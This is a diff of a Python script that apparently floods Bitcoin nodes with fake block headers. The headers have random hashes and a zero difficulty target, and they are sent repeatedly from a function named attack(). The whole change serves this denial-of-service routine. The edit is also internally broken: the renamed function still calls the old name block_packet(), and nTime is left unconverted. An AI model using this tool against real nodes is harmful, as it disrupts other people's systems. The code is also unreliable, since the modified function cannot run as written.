@@ -91,10 +91,10 @@ def ip_alias(ip_address):
 	return interface
 
 # Construct a block packet using python-bitcoinlib
-def block_packet():
+def block_packet_bytes():
 	hashPrevBlock = bytearray(random.getrandbits(8) for _ in range(32))
 	hashMerkleRoot = bytearray(random.getrandbits(8) for _ in range(32))
-	nTime = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds()).to_bytes(8, 'little')
+	nTime = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds())#.to_bytes(8, 'little')
 	nNonce = random.getrandbits(32)
 	msg = CBlockHeader(
 		nVersion=bitcoin_protocolversion,
@@ -106,7 +106,9 @@ def block_packet():
 		nBits=0,
 		nNonce=nNonce
 	)
-	return msg
+	f = _BytesIO()
+	block_packet().stream_serialize(f)
+	return f.getvalue()
 
 # Construct a version packet using python-bitcoinlib
 def version_packet(src_ip, dst_ip, src_port, dst_port):
@@ -208,7 +210,7 @@ def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 		if seconds_between_version_packets != 0:
 			time.sleep(seconds_between_version_packets)
 		try:
-			socket.send(block_packet().to_bytes())
+			socket.send(block_packet_bytes())
 		except Exception as e:
 			print(e)
 			break
